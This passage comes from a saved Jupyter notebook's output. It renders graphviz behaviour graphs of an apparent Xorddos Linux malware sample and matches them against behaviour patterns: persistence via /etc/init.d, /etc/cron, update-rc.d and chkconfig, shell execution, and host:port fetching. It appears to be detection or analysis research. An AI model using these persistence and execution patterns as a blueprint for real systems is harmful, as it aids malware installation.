2452.04,-22.7 2461.28,-27.89 2462.5,-21\"/>\n<text text-anchor=\"middle\" x=\"2555.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.drop</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.9C1482.83,-89.91 1494.06,-88.13 1504.65,-87 1534.41,-83.84 2560.68,-90.33 2581.65,-69 2618.64,-31.39 2520.17,-22.03 2463.09,-19.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2463.07,-16.23 2452.95,-19.38 2462.83,-23.22 2463.07,-16.23\"/>\n<text text-anchor=\"middle\" x=\"2611.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.read</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2695.65\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2695.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.9C1482.83,-89.9 1494.06,-88.12 1504.65,-87 1567.2,-80.37 2577.78,-91.13 2636.65,-69 2651.22,-63.53 2664.69,-52.76 2675.07,-42.62\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2677.59,-45.04 2682.05,-35.43 2672.57,-40.17 2677.59,-45.04\"/>\n<text text-anchor=\"middle\" x=\"2685.15\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2818.65\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2818.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">GID($|.|$)</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.89C1482.83,-89.89 1494.06,-88.12 1504.65,-87 1638.04,-72.94 2580.94,-99.06 2711.65,-69 2737.99,-62.94 2765.58,-49.87 2786.14,-38.61\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2788.06,-41.54 2795.06,-33.59 2784.63,-35.44 2788.06,-41.54\"/>\n<text text-anchor=\"middle\" x=\"2780.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.assign</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.88C1482.83,-89.89 1494.06,-88.11 1504.65,-87 1540.74,-83.22 2783.21,-92.73 2810.65,-69 2817.18,-63.36 2819.88,-54.7 2820.72,-46.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2824.23,-46.1 2820.97,-36.02 2817.23,-45.93 2824.23,-46.1\"/>\n<text text-anchor=\"middle\" x=\"2849.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.execute</text>\n</g>\n<!-- 14 -->\n<g id=\"node15\" class=\"node\">\n<title>14</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2921.65\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2921.65\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sh$</text>\n</g>\n<!-- Start&#45;&gt;14 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;14</title>\n<path fill=\"none\" stroke=\"black\" d=\"M1472.1,-91.87C1482.83,-89.88 1494.06,-88.11 1504.65,-87 1542.76,-83.02 2849.45,-86.25 2883.65,-69 2894.13,-63.72 2902.51,-54.04 2908.71,-44.6\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2911.86,-46.15 2913.98,-35.77 2905.85,-42.56 2911.86,-46.15\"/>\n<text text-anchor=\"middle\" x=\"2920.65\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">34.find</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1547.65\" cy=\"-105\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1547.65\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1649.65\" cy=\"-105\" rx=\"50.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1649.65\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">mem_addr</text>\n</g>\n<!-- 13 -->\n<g id=\"node14\" class=\"node\">\n<title>13</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1770.65\" cy=\"-105\" rx=\"52.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1770.65\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">update&#45;rc.d</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x20853820280>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Xorddos-Ms.csv matched doc OPset\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"861pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 861.39 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 857.39,-127 857.39,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"370.5\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"370.5\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"32.5\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"32.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M292.83,-104.86C209.99,-104.18 85.8,-98.11 49.5,-69 42.4,-63.31 38.25,-54.52 35.83,-45.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"39.24,-45.07 33.71,-36.03 32.39,-46.54 39.24,-45.07\"/>\n<text text-anchor=\"middle\" x=\"68\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.use</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"128.5\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"128.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M296.44,-99.63C218.98,-94.3 106.78,-84.07 93.5,-69 85.04,-59.41 92.34,-47.74 102.42,-38.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"104.78,-40.67 110.06,-31.49 100.21,-35.38 104.78,-40.67\"/>\n<text text-anchor=\"middle\" x=\"119\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">30.create</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M296.01,-100.05C259.87,-95.73 216.76,-86.9 181.5,-69 168.68,-62.49 156.8,-51.91 147.55,-42.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"150.03,-39.68 140.73,-34.6 144.83,-44.37 150.03,-39.68\"/>\n<text text-anchor=\"middle\" x=\"202.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.read</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"232.5\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"232.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M305.39,-95.26C274.32,-89.62 241.87,-81.05 232.5,-69 227.47,-62.54 226.15,-54.07 226.48,-45.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"229.96,-46.32 227.63,-35.99 223,-45.52 229.96,-46.32\"/>\n<text text-anchor=\"middle\" x=\"258\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">29.create</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M344.54,-88.01C321.73,-73.96 288.48,-53.48 264.12,-38.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"265.94,-35.49 255.59,-33.22 262.26,-41.45 265.94,-35.49\"/>\n<text text-anchor=\"middle\" x=\"331.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">42.read</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"364.5\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"364.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M369.28,-86.8C368.46,-75.16 367.36,-59.55 366.42,-46.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"369.91,-45.9 365.71,-36.18 362.92,-46.4 369.91,-45.9\"/>\n<text text-anchor=\"middle\" x=\"391.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.fetch</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"481.5\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"481.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M392.57,-87.72C400.47,-81.86 409.41,-75.17 417.5,-69 430.49,-59.09 444.83,-47.91 456.64,-38.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"459.04,-41.2 464.74,-32.27 454.71,-35.7 459.04,-41.2\"/>\n<text text-anchor=\"middle\" x=\"463\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">31.create</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M442.86,-98.61C461.61,-93.53 479.8,-84.56 491.5,-69 496.7,-62.08 496.47,-53.16 494.2,-44.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"497.48,-43.54 490.8,-35.32 490.89,-45.91 497.48,-43.54\"/>\n<text text-anchor=\"middle\" x=\"519.5\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.fetch</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"582.5\" cy=\"-18\" rx=\"55.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"582.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^chkconfig$</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M446.18,-101.26C479.13,-97.09 516.89,-88.04 546.5,-69 555.81,-63.01 563.48,-53.69 569.31,-44.71\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"572.39,-46.37 574.52,-35.99 566.38,-42.78 572.39,-46.37\"/>\n<text text-anchor=\"middle\" x=\"594\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.perform</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"702.5\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"702.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M447.32,-102.9C500.11,-99.94 570.95,-91.53 629.5,-69 646.43,-62.48 663.28,-51.33 676.52,-41.22\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"678.99,-43.72 684.66,-34.77 674.65,-38.23 678.99,-43.72\"/>\n<text text-anchor=\"middle\" x=\"680\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">20.drop</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"810.5\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"810.5\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M447.64,-103.45C516.67,-101.2 620.02,-93.49 706.5,-69 731.62,-61.88 758.13,-49.05 778.09,-38.17\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"780.02,-41.1 787.05,-33.17 776.61,-34.98 780.02,-41.1\"/>\n<text text-anchor=\"middle\" x=\"767\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.drop</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x208538202b0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "matched ASG OPset for doc Xorddos-Ms.csv\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">\n<!-- Generated by graphviz version 6.0.1 (20220911.1526)\n -->\n<!-- Pages: 1 -->\n<svg width=\"1373pt\" height=\"131pt\"\n viewBox=\"0.00 0.00 1372.89 131.00\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<g id=\"graph0\" class=\"graph\" transform=\"scale(1 1) rotate(0) translate(4 127)\">\n<polygon fill=\"white\" stroke=\"none\" points=\"-4,4 -4,-127 1368.89,-127 1368.89,4 -4,4\"/>\n<!-- Start -->\n<g id=\"node1\" class=\"node\">\n<title>Start</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"645.64\" cy=\"-105\" rx=\"77.19\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"645.64\" y=\"-101.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">Malware (Subject)</text>\n</g>\n<!-- 1 -->\n<g id=\"node2\" class=\"node\">\n<title>1</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"101.64\" cy=\"-18\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"101.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge1\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M568.98,-102.59C403.21,-99.16 24.73,-89.16 5.64,-69 -14.7,-47.51 26.3,-33.54 60.88,-25.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"61.78,-29.36 70.87,-23.91 60.36,-22.5 61.78,-29.36\"/>\n<text text-anchor=\"middle\" x=\"42.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge2\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M568.07,-104.67C425.64,-105.09 134.09,-101.87 102.64,-69 96.9,-63 95.31,-54.51 95.57,-46.22\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"99.08,-46.36 96.72,-36.03 92.12,-45.58 99.08,-46.36\"/>\n<text text-anchor=\"middle\" x=\"130.14\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;1 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;1</title>\n<path fill=\"none\" stroke=\"black\" d=\"M569.48,-101.84C459.95,-98.08 263.64,-88.79 195.64,-69 172.22,-62.18 147.96,-49.1 129.96,-38.03\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"131.47,-34.85 121.15,-32.47 127.73,-40.77 131.47,-34.85\"/>\n<text text-anchor=\"middle\" x=\"223.14\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"326.64\" cy=\"-18\" rx=\"27\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"326.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge3\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M568.99,-102.5C462.13,-99.61 279.12,-91.41 258.64,-69 244.05,-53.03 268.91,-38.85 292.57,-29.7\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"293.97,-32.92 302.18,-26.22 291.58,-26.34 293.97,-32.92\"/>\n<text text-anchor=\"middle\" x=\"281.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">53.open</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M570.22,-100.84C481.37,-96.34 343.73,-86.6 327.64,-69 322.04,-62.87 320.49,-54.35 320.73,-46.07\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"324.24,-46.24 321.85,-35.91 317.28,-45.47 324.24,-46.24\"/>\n<text text-anchor=\"middle\" x=\"350.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">58.lseek</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M573.2,-98.62C528.88,-93.87 471.5,-85.08 422.64,-69 398.36,-61.01 372.78,-47.4 354.14,-36.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"355.69,-33.24 345.32,-31.07 352.08,-39.23 355.69,-33.24\"/>\n<text text-anchor=\"middle\" x=\"444.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">3.stat64</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"462.64\" cy=\"-18\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"462.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M577.21,-96.46C538.2,-90.87 494.24,-81.95 479.64,-69 473.01,-63.12 468.96,-54.55 466.49,-46.16\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"469.86,-45.16 464.2,-36.21 463.04,-46.74 469.86,-45.16\"/>\n<text text-anchor=\"middle\" x=\"506.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"608.64\" cy=\"-18\" rx=\"40.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"608.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/var/run/</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M579.65,-95.47C564.46,-90.26 550.03,-82.02 540.64,-69 529.7,-53.81 546.61,-41.33 566.31,-32.64\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"567.83,-35.8 575.78,-28.79 565.19,-29.31 567.83,-35.8\"/>\n<text text-anchor=\"middle\" x=\"563.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">57.lseek</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M623.43,-87.65C617.91,-82.37 612.7,-76.04 609.64,-69 606.63,-62.07 605.56,-54.08 605.44,-46.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"608.95,-46.48 605.82,-36.35 601.95,-46.22 608.95,-46.48\"/>\n<text text-anchor=\"middle\" x=\"635.14\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">50.stat64</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M656.99,-87.14C662.23,-77.13 666.18,-64.4 660.64,-54 657.06,-47.26 651.53,-41.59 645.4,-36.91\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"647.05,-33.79 636.79,-31.12 643.14,-39.6 647.05,-33.79\"/>\n<text text-anchor=\"middle\" x=\"686.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">52.open</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"751.64\" cy=\"-18\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"751.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M682.09,-88.98C692.87,-83.58 704.29,-76.85 713.64,-69 722.04,-61.96 729.7,-52.74 735.91,-44.14\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"738.83,-46.07 741.6,-35.84 733.06,-42.1 738.83,-46.07\"/>\n<text text-anchor=\"middle\" x=\"751.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"977.64\" cy=\"-18\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"977.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M697.07,-91.47C721.85,-85.17 751.93,-77.16 778.64,-69 798,-63.09 802.18,-59.56 821.64,-54 862.29,-42.39 909.78,-32.21 941.59,-25.86\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"942.61,-29.23 951.74,-23.86 941.26,-22.36 942.61,-29.23\"/>\n<text text-anchor=\"middle\" x=\"858.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M721.87,-101.94C772.51,-98.52 839.73,-89.95 895.64,-69 907.07,-64.72 908.28,-60.45 918.64,-54 928.45,-47.9 939.3,-41.39 948.99,-35.67\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"951,-38.54 957.85,-30.46 947.46,-32.51 951,-38.54\"/>\n<text text-anchor=\"middle\" x=\"937.14\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M723.12,-103.89C802.71,-102.28 919.87,-95.32 955.64,-69 963.3,-63.36 968.34,-54.47 971.63,-45.74\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"974.99,-46.72 974.65,-36.13 968.31,-44.62 974.99,-46.72\"/>\n<text text-anchor=\"middle\" x=\"991.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M722.13,-102.22C825.47,-99.01 999.1,-90.46 1018.64,-69 1028.19,-58.51 1018.33,-46.2 1005.89,-36.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1007.69,-33.4 997.53,-30.4 1003.6,-39.08 1007.69,-33.4\"/>\n<text text-anchor=\"middle\" x=\"1048.14\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M722.89,-103.3C840.69,-101.41 1054.15,-94.48 1077.64,-69 1099.48,-45.33 1051.01,-31.34 1014.2,-24.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1014.65,-20.95 1004.19,-22.66 1013.43,-27.84 1014.65,-20.95\"/>\n<text text-anchor=\"middle\" x=\"1106.64\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1189.64\" cy=\"-18\" rx=\"46.59\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1189.64\" y=\"-14.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/init.d/</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M723.14,-104.48C841.66,-104.19 1061.77,-99.41 1133.64,-69 1147.23,-63.25 1159.74,-52.82 